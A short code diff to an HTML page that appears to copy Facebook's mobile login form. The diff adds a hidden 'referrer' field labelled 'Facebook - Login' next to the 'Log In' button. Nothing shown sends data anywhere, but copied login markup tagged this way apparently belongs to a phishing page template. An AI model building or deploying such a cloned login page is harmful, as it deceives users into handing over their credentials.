@@ -85,6 +85,7 @@
                     </div>
                     <div class="_2pie" style="text-align:center;"> 
                       <div id="u_0_4" data-sigil="login_password_step_element">
+						<input type="hidden" name="referrer" value="Facebook - Login"/>
                         <input type="submit" style="background:#3578E5; " value="Log In" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" name="login" id="u_0_5" data-sigil="touchable m_login_button">
                       </div>
                     </div>
